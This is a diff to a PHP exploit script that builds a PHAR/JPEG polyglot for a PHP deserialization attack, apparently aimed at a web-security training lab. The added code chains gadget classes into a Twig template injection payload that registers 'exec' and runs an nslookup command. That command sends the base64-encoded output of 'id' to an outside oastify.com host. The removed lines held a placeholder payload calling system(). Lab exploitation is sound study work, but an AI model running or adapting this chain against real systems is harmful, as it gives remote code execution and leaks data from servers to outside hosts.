@@ -1,5 +1,66 @@
 <?php
 
+class Blog {
+    public $user;
+    public $desc;
+    private $twig;
+
+    public function __construct($user, $desc) {
+        $this->user = $user;
+        $this->desc = $desc;
+    }
+
+    public function __toString() {
+        return $this->twig->render('index', ['user' => $this->user]);
+    }
+
+    public function __wakeup() {
+        $loader = new Twig_Loader_Array([
+            'index' => $this->desc,
+        ]);
+        $this->twig = new Twig_Environment($loader);
+    }
+
+    public function __sleep() {
+        return ["user", "desc"];
+    }
+}
+class CustomTemplate {
+    private $template_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lockFilePath());
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lockFilePath(), "") === false) {
+                throw new Exception("Could not write to " . $this->lockFilePath());
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        @unlink($this->lockFilePath());
+    }
+
+    private function lockFilePath()
+    {
+        return 'templates/' . $this->template_file_path . '.lock';
+    }
+}
 
 function generate_base_phar($o, $prefix){
     global $tempname;
@@ -34,14 +95,11 @@ function generate_polyglot($phar, $jpeg){
 }
 
 
-// pop exploit class
-class PHPObjectInjection {}
-$object = new PHPObjectInjection;
-$object->inject = 'system("ping -c 10 127.0.0.1");';
-$object->out = 'Hallo World';
-
-
-
+$blog = new Blog("abc","abc"); 
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup $(id|base64).fsbv6ijbccu23p7eza3h7n6oxf36rwfl.oastify.com")}}';
+$blog->user = 'user'; 
+$object = new CustomTemplate($blog); // $object->template_file_path = $blog; 
+										   
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
 $jpeg = file_get_contents('in.jpg');
